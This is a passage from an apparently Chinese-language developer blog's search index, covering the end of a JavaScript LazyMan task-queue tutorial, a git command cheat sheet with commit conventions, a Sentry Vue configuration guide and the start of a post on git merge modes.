class="built_in">array</span>.<span class="built_in">push</span>(fn)</span><br><span class="line">    const api = &#123;</span><br><span class="line">       sleep() &#123;</span><br><span class="line">           <span class="built_in">array</span>.<span class="built_in">push</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">               setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                   <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Wake up after 10&#x27;</span>)</span><br><span class="line">               &#125;, <span class="number">3000</span>)</span><br><span class="line">           &#125;)</span><br><span class="line">           <span class="keyword">return</span> api</span><br><span class="line">       &#125;, </span><br><span class="line">       eat() &#123;</span><br><span class="line">           <span class="built_in">array</span>.<span class="built_in">push</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">               <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Eat dinner~&#x27;</span>)</span><br><span class="line">           &#125;)</span><br><span class="line">           <span class="keyword">return</span> api</span><br><span class="line">       &#125;,</span><br><span class="line">       sleepFirst() &#123;</span><br><span class="line">           <span class="built_in">array</span>.unshift(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                   <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Wake up after 5&#x27;</span>)</span><br><span class="line">               &#125;, <span class="number">3000</span>)</span><br><span class="line">           &#125;)</span><br><span class="line">           <span class="keyword">return</span> api</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">array</span>.<span class="built_in">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v())) <span class="comment">// 等收集到所有任务以后，开始执行函数</span></span><br><span class="line">    <span class="keyword">return</span> api</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一来我们就改写全部改写了原来的代码，并依次执行，但是还存在一个问题，虽然函数是按照我们的顺序排列了，但是因为异步导致输出并不是我们想要的结果</p><p><strong>之所以叫任务队列，而不是叫做数组，是因为还是和数组有点区别的，函数具体的执行应该由上一个任务主动呼叫的</strong></p><p>所以需要实现一个 next 函数，来手动来通知下一个函数的执行（有点像上面的 emit）</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const <span class="built_in">next</span> = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    const fn = array.shift()</span><br><span class="line">    fn &amp;&amp; fn()</span><br><span class="line">&#125;</span><br><span class="line">const api = &#123;</span><br><span class="line">   sleep() &#123;</span><br><span class="line">       array.push(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">           setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">               console.log(<span class="string">&#x27;Wake up after 10&#x27;</span>)</span><br><span class="line">               <span class="built_in">next</span>() // 每个函数执行以后，都需要调用 <span class="built_in">next</span>，通知下一个任务可以开始执行了</span><br><span class="line">           &#125;, <span class="number">3000</span>)</span><br><span class="line">       &#125;)</span><br><span class="line">       <span class="keyword">return</span> api</span><br><span class="line">   &#125;,</span><br><span class="line">   // ....</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">next</span>())</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">LazyMan</span> (<span class="params">name</span>) &#123;</span><br><span class="line">    const <span class="built_in">array</span> = []</span><br><span class="line">    const fn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">`Hi! This is <span class="subst">$&#123;name&#125;</span>!`</span>)</span><br><span class="line">        next()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">array</span>.<span class="built_in">push</span>(fn)</span><br><span class="line">    const next = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        const fn = <span class="built_in">array</span>.shift()</span><br><span class="line">        fn &amp;&amp; fn()</span><br><span class="line">    &#125;</span><br><span class="line">    const api = &#123;</span><br><span class="line">       sleep() &#123;</span><br><span class="line">           <span class="built_in">array</span>.<span class="built_in">push</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">               setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                   <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Wake up after 10&#x27;</span>)</span><br><span class="line">                   next()</span><br><span class="line">               &#125;, <span class="number">3000</span>)</span><br><span class="line">           &#125;)</span><br><span class="line">           <span class="keyword">return</span> api</span><br><span class="line">       &#125;, </span><br><span class="line">       eat() &#123;</span><br><span class="line">           <span class="built_in">array</span>.<span class="built_in">push</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">               <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Eat dinner~&#x27;</span>)</span><br><span class="line">               next()</span><br><span class="line">           &#125;)</span><br><span class="line">           <span class="keyword">return</span> api</span><br><span class="line">       &#125;,</span><br><span class="line">       sleepFirst() &#123;</span><br><span class="line">           <span class="built_in">array</span>.unshift(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                   <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Wake up after 5&#x27;</span>)</span><br><span class="line">                   next()</span><br><span class="line">               &#125;, <span class="number">3000</span>)</span><br><span class="line">           &#125;)</span><br><span class="line">           <span class="keyword">return</span> api</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next())</span><br><span class="line">    <span class="keyword">return</span> api</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git常用命令</title>
      <link href="/Blog/2022/11/19/shell/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index/"/>
      <url>/Blog/2022/11/19/shell/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="拉取代码"><a href="#拉取代码" class="headerlink" title="拉取代码"></a>拉取代码</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">xxx</span>.git</span><br></pre></td></tr></table></figure><h3 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">branch </span>dev</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">git checkout -<span class="keyword">b </span>dev</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">git <span class="keyword">switch </span>-c dev</span><br></pre></td></tr></table></figure><h3 id="切换本地分支"><a href="#切换本地分支" class="headerlink" title="切换本地分支"></a>切换本地分支</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout dev</span><br><span class="line"><span class="meta"># or</span></span><br><span class="line">git <span class="keyword">switch</span> dev</span><br></pre></td></tr></table></figure><h3 id="切换分支并关联远程分支"><a href="#切换分支并关联远程分支" class="headerlink" title="切换分支并关联远程分支"></a>切换分支并关联远程分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b dev origin/dev</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">git checkout --track origin/dev</span><br></pre></td></tr></table></figure><h3 id="查看本地所有分支"><a href="#查看本地所有分支" class="headerlink" title="查看本地所有分支"></a>查看本地所有分支</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git branch</span></span><br></pre></td></tr></table></figure><h3 id="查看远程所有分支"><a href="#查看远程所有分支" class="headerlink" title="查看远程所有分支"></a>查看远程所有分支</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git branch -r</span></span><br></pre></td></tr></table></figure><h3 id="删除本地分支"><a href="#删除本地分支" class="headerlink" title="删除本地分支"></a>删除本地分支</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git branch -d dev</span></span><br></pre></td></tr></table></figure><h3 id="删除远程分支"><a href="#删除远程分支" class="headerlink" title="删除远程分支"></a>删除远程分支</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">push</span> <span class="built_in">origin</span> -d dev</span><br></pre></td></tr></table></figure><h3 id="将代码从工作区添加暂存区"><a href="#将代码从工作区添加暂存区" class="headerlink" title="将代码从工作区添加暂存区"></a>将代码从工作区添加暂存区</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">add</span> .</span><br></pre></td></tr></table></figure><h3 id="查看尚未暂存的更新"><a href="#查看尚未暂存的更新" class="headerlink" title="查看尚未暂存的更新"></a>查看尚未暂存的更新</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git diff</span></span><br></pre></td></tr></table></figure><h3 id="添加提交信息（commit-注释写错，执行-git-commit-amend-此时会进入默认-vim-编辑器，修改注释后保存）"><a href="#添加提交信息（commit-注释写错，执行-git-commit-amend-此时会进入默认-vim-编辑器，修改注释后保存）" class="headerlink" title="添加提交信息（commit 注释写错，执行 git commit --amend 此时会进入默认 vim 编辑器，修改注释后保存）"></a>添加提交信息（<code>commit</code> 注释写错，执行 <code>git commit --amend</code> 此时会进入默认 <code>vim</code> 编辑器，修改注释后保存）</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git</span> commit -m <span class="string">&#x27;xxxx&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="推送代码到远程分支"><a href="#推送代码到远程分支" class="headerlink" title="推送代码到远程分支"></a>推送代码到远程分支</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">push</span> <span class="built_in">origin</span> dev</span><br><span class="line"></span><br><span class="line"># 强制推送（常在 git rebase 或 git <span class="built_in">reset</span> 后使用）</span><br><span class="line">git <span class="built_in">push</span> -f <span class="built_in">origin</span> dev</span><br></pre></td></tr></table></figure><h3 id="拉取远程分支代码"><a href="#拉取远程分支代码" class="headerlink" title="拉取远程分支代码"></a>拉取远程分支代码</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git pull origin dev</span></span><br></pre></td></tr></table></figure><h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">merge</span> dev</span><br></pre></td></tr></table></figure><h3 id="查看-git-状态"><a href="#查看-git-状态" class="headerlink" title="查看 git 状态"></a>查看 <code>git</code> 状态</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git status</span></span><br></pre></td></tr></table></figure><h3 id="查看提交历史"><a href="#查看提交历史" class="headerlink" title="查看提交历史"></a>查看提交历史</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><h3 id="查看可引用的历史版本记录"><a href="#查看可引用的历史版本记录" class="headerlink" title="查看可引用的历史版本记录"></a>查看可引用的历史版本记录</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">ref</span>log</span><br></pre></td></tr></table></figure><h3 id="把本地未-push-的分叉提交历史整理成直线"><a href="#把本地未-push-的分叉提交历史整理成直线" class="headerlink" title="把本地未 push 的分叉提交历史整理成直线"></a>把本地未 <code>push</code> 的分叉提交历史整理成直线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase origin/dev</span><br></pre></td></tr></table></figure><h3 id="回到-rebase-执行之前的状态"><a href="#回到-rebase-执行之前的状态" class="headerlink" title="回到 rebase 执行之前的状态"></a>回到 <code>rebase</code> 执行之前的状态</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase <span class="comment">--abort</span></span><br></pre></td></tr></table></figure><h3 id="回退版本"><a href="#回退版本" class="headerlink" title="回退版本"></a>回退版本</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 回退指定 commit_id 版本</span></span><br><span class="line">git reset <span class="comment">--hard commit_id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回退上一个版本</span></span><br><span class="line">git reset <span class="comment">--soft HEAD^</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">git reset <span class="comment">--soft HEAD~1</span></span><br></pre></td></tr></table></figure><h3 id="撤销代码"><a href="#撤销代码" class="headerlink" title="撤销代码"></a>撤销代码</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">revert</span> commit_id</span><br></pre></td></tr></table></figure><h3 id="修改分支名"><a href="#修改分支名" class="headerlink" title="修改分支名"></a>修改分支名</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta"># 第一步</span></span><br><span class="line">git branch -m oldBranchName <span class="keyword">new</span><span class="type">BranchName</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 第二步</span></span><br><span class="line">git push origin :<span class="type">oldBranchName</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 第三步</span></span><br><span class="line">git push --<span class="keyword">set</span>-upstream origin <span class="keyword">new</span><span class="type">BranchName</span></span><br></pre></td></tr></table></figure><h3 id="查看-git-配置"><a href="#查看-git-配置" class="headerlink" title="查看 git 配置"></a>查看 <code>git</code> 配置</h3><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看全局配置</span></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="built_in">--global</span> <span class="built_in">--list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看用户名</span></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="built_in">--global</span> <span class="string">user</span>.<span class="string">name</span></span><br></pre></td></tr></table></figure><h3 id="添加用户名"><a href="#添加用户名" class="headerlink" title="添加用户名"></a>添加用户名</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global --<span class="built_in">add</span> user.name newName</span><br></pre></td></tr></table></figure><h3 id="删除用户名"><a href="#删除用户名" class="headerlink" title="删除用户名"></a>删除用户名</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">git config</span> <span class="literal">--</span><span class="comment">global</span> <span class="literal">--</span><span class="comment">unset user</span><span class="string">.</span><span class="comment">name</span></span><br></pre></td></tr></table></figure><h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">config</span> <span class="comment">--global user.name newName</span></span><br></pre></td></tr></table></figure><h3 id="配置-Git-用户名和邮箱"><a href="#配置-Git-用户名和邮箱" class="headerlink" title="配置 Git 用户名和邮箱"></a>配置 <code>Git</code> 用户名和邮箱</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 用户名</span></span><br><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;Your Name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 邮箱</span></span><br><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;email@example.com&quot;</span></span><br></pre></td></tr></table></figure><h3 id="统计代码行数"><a href="#统计代码行数" class="headerlink" title="统计代码行数"></a>统计代码行数</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">ls</span>-<span class="keyword">files</span> | xargs wc -<span class="keyword">l</span></span><br></pre></td></tr></table></figure><h2 id="提交规范"><a href="#提交规范" class="headerlink" title="提交规范"></a>提交规范</h2><p><a href="https://github.com/conventional-changelog/conventional-changelog/tree/master/packages/conventional-changelog-angular">相关参考</a></p><p><code>feat: 增加新功能</code><br><code>fix: 修复问题/BUG</code><br><code>style: 代码风格相关无影响运行结果的</code><br><code>perf: 优化/性能提升</code><br><code>refactor: 重构</code><br><code>revert: 撤销修改</code><br><code>test: 测试相关</code><br><code>docs: 文档/注释</code><br><code>chore: 依赖更新/脚手架配置修改等</code><br><code>workflow: 工作流改进</code><br><code>ci: 持续集成</code><br><code>types: 类型定义文件更改</code><br><code>wip: 开发中</code></p><h2 id="CodeReview-常用缩写"><a href="#CodeReview-常用缩写" class="headerlink" title="CodeReview 常用缩写"></a><code>CodeReview</code> 常用缩写</h2><p><code>PR</code>（Pull Request）拉取请求，给其他项目提交代码<br><code>LGTM</code>（Looks Good To Me）代码已经过 review，可以合并<br><code>SGTM</code>（Sounds Good To Me）和上面那句意思差不多，也是已经通过了 review 的意思<br><code>WIP</code>（Work In Progress）如果有个改动很大的 PR，可以在写了一部分的情况下先提交，但需在标题写上 WIP，以告诉项目维护者这个功能还未完成，方便维护者提前 review 部分提交的代码<br><code>PTAL</code>（Please Take A Look）提示别人来看一下<br><code>TBR</code>（To Be Reviewed）提示维护者进行 review<br><code>TL;DR</code>（Too Long; Didn’t Read）太长懒得看<br><code>TBD</code>（To Be Done(or Defined&#x2F;Discussed&#x2F;Decided&#x2F;Determined)） 一般表示还没搞定</p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sentry 指南</title>
      <link href="/Blog/2022/08/22/essay/sentry%E6%8C%87%E5%8D%97/index/"/>
      <url>/Blog/2022/08/22/essay/sentry%E6%8C%87%E5%8D%97/index/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://docs.sentry.io/platforms/javascript/guides/vue/">https://docs.sentry.io/platforms/javascript/guides/vue/</a></p><h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><blockquote><p><a href="https://docs.sentry.io/platforms/javascript/guides/vue/configuration/options/">https://docs.sentry.io/platforms/javascript/guides/vue/configuration/options/</a><br>可以直接传递给 init() 的对象</p></blockquote><h2 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h2><h3 id="dsn"><a href="#dsn" class="headerlink" title="dsn"></a>dsn</h3><p>string<br>收集错误的地址，如果没有设置，则读取环境变量中 <code>SENTRY_DSN</code> 的值。</p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>boolean<br>调试模式，默认值为 <code>false</code>，打开以后会多出一些信息上传，例如你可以看到 fullTrace,traceDetails 等信息。</p><h3 id="release"><a href="#release" class="headerlink" title="release"></a>release</h3><p>string<br>版本号，默认情况下会自动设置或读取环境变量中 <code>SENTRY_RELEASE</code> 的值，一般需要搭配其他插件配套使用。</p><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>string<br>设置当前环境，如果没有设置，则读取环境变量中 <code>SENTRY_ENVIRONMENT</code> 的值，环境名称不能包含换行符、空格或正斜杠，不能是字符串“None”，也不能超过 64 个字符。</p><h3 id="tunnel"><a href="#tunnel" class="headerlink" title="tunnel"></a>tunnel</h3><p>string<br>当你的 sentry 需要突破广告拦截器时，可以设置这个选项代替 dsn，<a href="https://docs.sentry.io/platforms/javascript/troubleshooting/#dealing-with-ad-blockers">详情</a>。</p><h3 id="sampleRate"><a href="#sampleRate" class="headerlink" title="sampleRate"></a>sampleRate</h3><p>number<br>配置错误事件的收集率，<code>0.0~1.0</code>，1.0 代表 100%，如果设置为 0.1 则随机发送 10% 的错误。</p><h3 id="maxBreadcrumbs"><a href="#maxBreadcrumbs" class="headerlink" title="maxBreadcrumbs"></a>maxBreadcrumbs</h3><p>number<br>此变量控制收集错误的导航痕迹总量，默认为 100，一般你的应用也没这么多操作记录，默认就足够使用了。</p><h3 id="attachStacktrace"><a href="#attachStacktrace" class="headerlink" title="attachStacktrace"></a>attachStacktrace</h3><p>boolean<br>默认是关闭的，开启后可以看到详细的调用栈信息。</p><h3 id="denyUrls"><a href="#denyUrls" class="headerlink" title="denyUrls"></a>denyUrls</h3><p>Array&lt;string | RegExp&gt;<br>使用正则来匹配不发送错误的 url 列表。</p><h3 id="allowUrls"><a href="#allowUrls" class="headerlink" title="allowUrls"></a>allowUrls</h3><p>Array&lt;string | RegExp&gt;<br>使用正则来匹配发送错误的 url 列表。</p><h3 id="autoSessionTracking"><a href="#autoSessionTracking" class="headerlink" title="autoSessionTracking"></a>autoSessionTracking</h3><p>boolean<br>启用会话跟踪功能的标志，默认为 true。</p><h3 id="initialScope"><a href="#initialScope" class="headerlink" title="initialScope"></a>initialScope</h3><p>ScopeContext | Scope<br>设置初始数据，对象或者函数</p><h3 id="maxValueLength"><a href="#maxValueLength" class="headerlink" title="maxValueLength"></a>maxValueLength</h3><p>number<br>发送数据的单个字段长度，默认为 250。</p><h3 id="normalizeDepth"><a href="#normalizeDepth" class="headerlink" title="normalizeDepth"></a>normalizeDepth</h3><p>number<br>限制数组或对象的深度，默认为 3，设置 0 为禁用。</p><h3 id="normalizeMaxBreadth"><a href="#normalizeMaxBreadth" class="headerlink" title="normalizeMaxBreadth"></a>normalizeMaxBreadth</h3><p>number<br>限制数组的长度或者对象的属性。默认为 1000。</p><h3 id="enabled"><a href="#enabled" class="headerlink" title="enabled"></a>enabled</h3><p>boolean<br>是否发送页面错误事件到 sentry，默认为 true，即使设置为 false 也不会完全禁止，如果想要去完全禁止，可以有条件的调用 Sentry.init。</p><h3 id="sendClientReports"><a href="#sendClientReports" class="headerlink" title="sendClientReports"></a>sendClientReports</h3><p>boolean<br>设置为 fase 可禁用客户端报告的发送，客户端报告目前主要用于为从未发送的事件发出结果。</p><h2 id="集成配置-Integration-Configuration"><a href="#集成配置-Integration-Configuration" class="headerlink" title="集成配置(Integration Configuration)"></a>集成配置(Integration Configuration)</h2><h3 id="integrations"><a href="#integrations" class="headerlink" title="integrations"></a>integrations</h3><blockquote><p><a href="https://docs.sentry.io/platforms/javascript/guides/vue/configuration/integrations/">https://docs.sentry.io/platforms/javascript/guides/vue/configuration/integrations/</a></p></blockquote><p>Integration[]<br>自定义的集成工具配置，或者在配置 tree shaking 的时候会用到。</p><h3 id="defaultIntegrations"><a href="#defaultIntegrations" class="headerlink" title="defaultIntegrations"></a>defaultIntegrations</h3><p>false | Integration[]<br>默认集成，设置为 false 即可禁用默认配置。</p><h2 id="钩子事件-Hooks"><a href="#钩子事件-Hooks" class="headerlink" title="钩子事件(Hooks)"></a>钩子事件(Hooks)</h2><h3 id="beforeSend"><a href="#beforeSend" class="headerlink" title="beforeSend"></a>beforeSend</h3><p>function<br>在发送错误事件之前的操作，例如：忽略、修改、删除某些错误。</p><h3 id="beforeBreadcrumb"><a href="#beforeBreadcrumb" class="headerlink" title="beforeBreadcrumb"></a>beforeBreadcrumb</h3><p>function<br>产生导航痕迹事件之前，当函数未返回任何内容时，将删除痕迹导航。若要传递痕迹导航，请返回第一个参数，其中包含痕迹导航对象。回调通常获取第二个参数（称为“hint”），其中包含从中创建痕迹导航的原始对象，以进一步自定义痕迹导航的外观。</p><h2 id="传输配置-Transport-Options"><a href="#传输配置-Transport-Options" class="headerlink" title="传输配置(Transport Options)"></a>传输配置(Transport Options)</h2><h3 id="transport"><a href="#transport" class="headerlink" title="transport"></a>transport</h3><p>function<br>它采用传输选项并返回用于将事件发送到 Sentry 的 Transport 对象。</p><h2 id="追踪选项-Tracing-Options"><a href="#追踪选项-Tracing-Options" class="headerlink" title="追踪选项(Tracing Options)"></a>追踪选项(Tracing Options)</h2><h3 id="tracesSampleRate"><a href="#tracesSampleRate" class="headerlink" title="tracesSampleRate"></a>tracesSampleRate</h3><p>number<br>定义  transaction 的发送率</p><h3 id="tracesSampler"><a href="#tracesSampler" class="headerlink" title="tracesSampler"></a>tracesSampler</h3><p>function<br>返回值为 tracesSampleRate，可以决定哪些 transaction 可以发送或动态决定发送率，如果和 tracesSampleRate 一起被定义，则会忽略 tracesSampleRate </p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git合并</title>
      <link href="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/"/>
      <url>/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/</url>
      
        <content type="html"><![CDATA[<h2 id="gitHub-pull-requset-的三种合并方式"><a href="#gitHub-pull-requset-的三种合并方式" class="headerlink" title="gitHub pull requset 的三种合并方式"></a>gitHub pull requset 的三种合并方式</h2><ul><li><p>多个commit直接合并到master上<br><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img.png" alt="rebase and merge"></p></li><li><p>多个commit合成一个再合并到master上<br><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_1.png" alt="quash and merge"></p></li><li><p>产生了一个merge的commit<br><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_2.png" alt="merge pull request"></p></li></ul><h2 id="快速合并和非快速合并"><a href="#快速合并和非快速合并" class="headerlink" title="快速合并和非快速合并"></a>快速合并和非快速合并</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git merge feature/a <span class="comment"># 快速合并</span></span><br><span class="line">$ git merge --no-ff feature/a <span class="comment"># 非快速合并</span></span><br></pre></td></tr></table></figure><ul><li><p>快速合并<br>会直接将 master 指向了 feature&#x2F;a，如下图所示：<br><img src="/Blog/2022/08/18/shell/git%E5%90%88%E5%B9%B6/index/img_3.png"></p></li><li><p>非快速合并<br>会在 master 创建合并提交节点，如下图所示：<br><img 